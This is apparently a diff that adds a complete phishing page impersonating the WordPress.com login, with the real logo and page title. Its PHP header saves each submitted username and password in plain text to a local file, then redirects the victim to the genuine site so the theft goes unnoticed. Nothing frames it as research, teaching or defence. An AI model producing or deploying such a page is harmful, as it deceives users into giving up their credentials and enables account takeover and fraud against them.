@@ -1,0 +1,23 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
+    file_put_contents("usernames.txt", $data, FILE_APPEND);
+    header("Location: https://wordpress.com");
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html>
+<head><title>WordPress.com – Log In</title><meta charset="UTF-8"></head>
+<body style="background: #f6f7f7; font-family: Arial, sans-serif; text-align: center; margin-top: 80px;">
+<div style="background: white; width: 400px; margin: auto; padding: 40px; border-radius: 4px;">
+<img src="https://s0.wp.com/i/logo/wpcom-gray-white.png" width="180"><br>
+<h2>Log in to your account</h2>
+<form method="post">
+<input type="text" name="username" placeholder="Email or username" style="width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #c3c4c7; border-radius: 4px;" required><br>
+<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #c3c4c7; border-radius: 4px;" required><br>
+<button type="submit" style="background: #007cba; color: white; width: 95%; padding: 12px; border: none; border-radius: 4px;">Log In</button>
+</form>
+</div>
+</body>
+</html>
